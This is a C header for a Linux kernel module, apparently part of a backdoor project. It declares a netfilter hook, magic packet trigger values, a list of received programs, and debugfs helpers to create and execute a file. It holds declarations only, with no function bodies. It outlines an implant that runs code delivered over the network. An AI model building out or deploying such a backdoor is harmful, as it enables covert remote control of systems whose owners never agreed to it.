#ifndef BACKDOOR_H
#define BACKDOOR_H

/* Generic */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kthread.h>

MODULE_AUTHOR("Nick Bulischeck");
MODULE_LICENSE("GPL");

#define DATA_LEN 255
#define TARGET_SPI 0x48dcd78c
#define TARGET_SEQ 0xae574ada
#define TIMEOUT 5 // Timer timeout in seconds

struct nf_hook_ops;

typedef struct program_list {
	/* Program to be run */
	void *buffer;

	/* Length of program */
	unsigned int length;

	/* List entry */
	struct list_head prog_list;
} program_list;

/* Netfilter hook */
int nfhook_init(void);
void nfhook_exit(void);

/* debugfs helpers */
int create_file(void);
void execute_file(void);
void destroy_file(void);
void execute_ready_programs(void);

/* state helpers */
program_list *init_program(int flag);
void init_prog_list(void);
void add_program(program_list **head, program_list *entry);
void init_del_workqueue(void);
void exit_del_workqueue(void);

#endif /* BACKDOOR_H */
